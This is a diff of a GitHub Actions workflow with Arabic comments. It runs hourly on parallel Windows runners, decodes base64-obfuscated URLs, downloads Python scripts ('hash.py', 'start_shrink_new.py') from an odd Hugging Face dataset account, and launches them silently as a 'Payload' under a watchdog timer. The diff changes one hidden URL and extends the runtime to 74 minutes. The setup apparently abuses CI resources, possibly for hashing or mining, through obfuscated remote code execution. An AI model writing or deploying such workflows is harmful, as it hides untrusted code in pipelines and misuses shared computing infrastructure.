@@ -3,13 +3,13 @@ name: Background Task Automation
 on:
   workflow_dispatch: # للتشغيل اليدوي
   schedule:
-    - cron: '0 * * * *' # الجدولة للعمل كل ساعة تماماً على مدار الـ 24 ساعة (24 مرة يومياً)
+    - cron: '0 * * * *' # الجدولة للعمل كل ساعة تماماً على مدار الـ 24 ساعة
 
 jobs:
   execute-nodes:
     name: Worker-Instance [${{ matrix.node_index }}]
     runs-on: windows-2022
-    timeout-minutes: 60 # مدة الجلسة 60 دقيقة
+    timeout-minutes: 80 # تم زيادة مدة الجلسة الكلية إلى 80 دقيقة لتستوعب الساعة وربع براحة
     
     strategy:
       fail-fast: false
@@ -26,7 +26,7 @@ jobs:
           echo ">>> [SYSTEM] Starting Node-${{ matrix.node_index }} setup..."
           
           # فك تشفير الروابط الجديدة وتحميلها في المتغيرات
-          URL_HASH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2gvcmVzb2x2ZS9tYWluL2hhc2gucHk=" | base64 --decode)
+          URL_HASH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2h2L3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 --decode)
           URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2gzL3Jlc29sdmUvbWFpbi9zdGFydF9zaHJpbmtfbmV3LnB5" | base64 --decode)
           
           # حفظ الملفات (سيتم حفظ الملف الأساسي باسم start.py لتسهيل التشغيل)
@@ -39,7 +39,7 @@ jobs:
           echo ">>> [SYSTEM] Ready to execute."
 
       # ---------------------------------------------------------
-      # الخطوة الثانية: التشغيل الصامت مع نظام الحماية الزمني (1 ساعة)
+      # الخطوة الثانية: التشغيل الصامت مع نظام الحماية الزمني (1 ساعة وربع)
       # ---------------------------------------------------------
       - name: Launch Payload & Time Monitor
         shell: pwsh
@@ -60,19 +60,19 @@ jobs:
           }
           $activeProcess = Start-Process @ProcessArgs
           
-          Write-Output "[MONITOR] Watchdog is running. Timeout limit: 59 mins."
+          Write-Output "[MONITOR] Watchdog is running. Timeout limit: 74 mins."
           
           try {
-              # انتظار انتهاء العملية أو وصولها للحد الزمني (3540 ثانية = 59 دقيقة)
-              # نستخدم 59 دقيقة ليتمكن السكريبت من الإغلاق بسلاسة قبل بدء مهمة الساعة الجديدة
-              Wait-Process -InputObject $activeProcess -Timeout 3540 -ErrorAction Stop
+              # انتظار انتهاء العملية أو وصولها للحد الزمني (4440 ثانية = 74 دقيقة)
+              # نستخدم 74 دقيقة ليتمكن السكريبت من الإغلاق بسلاسة قبل انتهاء الـ 80 دقيقة
+              Wait-Process -InputObject $activeProcess -Timeout 4440 -ErrorAction Stop
               Write-Output "[SUCCESS] Task completed within limits."
           } 
           catch {
-              # إيقاف إجباري عند تخطي 59 دقيقة للسماح للمهمة التالية بالبدء نظيفة
-              Write-Output "[TIMEOUT] 59 minutes reached. Forcing process kill to transition to next hour's run..."
+              # إيقاف إجباري عند تخطي 74 دقيقة 
+              Write-Output "[TIMEOUT] 74 minutes reached. Forcing process kill to transition..."
               Stop-Process -InputObject $activeProcess -Force
-              Write-Output "[TERMINATED] Process closed gracefully by Watchdog after 1 Hour."
+              Write-Output "[TERMINATED] Process closed gracefully by Watchdog after 1 Hour and 14 mins."
           }
 
       # ---------------------------------------------------------
